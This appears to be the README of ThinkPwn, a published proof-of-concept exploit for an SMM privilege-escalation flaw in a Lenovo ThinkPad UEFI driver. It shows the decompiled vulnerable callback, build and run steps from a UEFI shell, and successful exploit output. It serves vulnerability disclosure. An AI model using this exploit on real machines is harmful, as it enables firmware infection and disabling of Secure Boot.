
  Lenovo ThinkPad System Management Mode arbitrary code execution exploit

***************************************************************************

For more information about this project please read the following article:

http://blog.cr4.sh/2016/06/exploring-and-exploiting-lenovo.html


This code exploits 0day privileges escalation vulnerability (or backdoor?) in SystemSmmRuntimeRt UEFI driver (GUID is 7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) of Lenovo firmware. Vulnerability is present in all of the ThinkPad series laptops, the oldest one that I have checked is X220 and the neweset one is T450s (with latest firmware versions available at this moment). Running of arbitrary System Management Mode code allows attacker to disable flash write protection and infect platform firmware, disable Secure Boot, bypass Virtual Secure Mode (Credential Guard, etc.) on Windows 10 Enterprise and do others evil things.

Vulnerable SMM callback code:

    EFI_STATUS __fastcall sub_AD3AFA54(
        EFI_HANDLE SmmImageHandle, VOID *CommunicationBuffer, UINTN *SourceSize)
    {
        VOID *v3; // rax@1
        VOID *v4; // rbx@1

        // get some structure pointer from EFI_SMM_COMMUNICATE_HEADER.Data
        v3 = *(VOID **)(CommunicationBuffer + 0x20);
        v4 = CommunicationBuffer;
        if (v3)
        {
            /*
              Vulnarability is here:
              this code calls some function by address from obtained v3 structure field.
            */
            *(v3 + 0x8)(*(VOID **)v3, &dword_AD002290, CommunicationBuffer + 0x18);

            // set zero value to indicate successful operation
            *(VOID **)(v4 + 0x20) = 0;
        }
        
        return 0;
    }


Proof of concept exploit for this vulnerability is designed as UEFI application that runs from UEFI shell. It's also possible to exploit it from runing operating system but you have to implement your own EFI_BASE_PROTOCOL.Communicate() function.

To build exploit from the source code on Windows with Visual Studio compiler you have to perform the following steps:

  1. Copy ThinkPwn project directory into the EDK2 source code directory.

  2. Run Visual Studio 2008 Command Prompt and cd to EDK2 directory.

  3. Execute Edk2Setup.bat --pull to configure build environment and download required binaries.

  4. Edit AppPkg/AppPkg.dsc file and add path of ThinkPwn/ThinkPwn.dsc to the end of the [Components] section.

  5. cd to the ThinkPwn project directory and run build command.

  6. After compilation resulting PE image file will be created at Build/AppPkg/DEBUG_VS2008x86/X64/ThinkPwn/ThinkPwn/OUTPUT/ThinkPwn.efi


To test exploit on your own hardware:

  1. Prepare FAT32 formatted USB flash drive with ThinkPwn.efi and UEFI Shell (https://github.com/tianocore/tianocore.github.io/wiki/Efi-shell) binaries.

  2. Boot into the UEFI shell and execute ThinkPwn.efi application.


Usage example:

FS1:\> ThinkPwn.efi

SMM access protocol is at 0xaa5f8b00
Available SMRAM regions:
 * 0xad000000:0xad3fffff
SMM base protocol is at 0xaa989340
Buffer for SMM communicate call is allocated at 0xacbfb018
Obtaining FvFile(7C79AC8C-5E6C-4E3D-BA6F-C260EE7C172E) image handles...
 * Handle = 0xa4aee798
   Communicate() returned status 0x0000000e, data size is 0x1000
 * Handle = 0xa4aee298
   Communicate() returned status 0x00000000, data size is 0x1000
SmmHandler() was executed, exploitation success!


Written by:
Dmytro Oleksiuk (aka Cr4sh)

cr4sh0@gmail.com
http://blog.cr4.sh
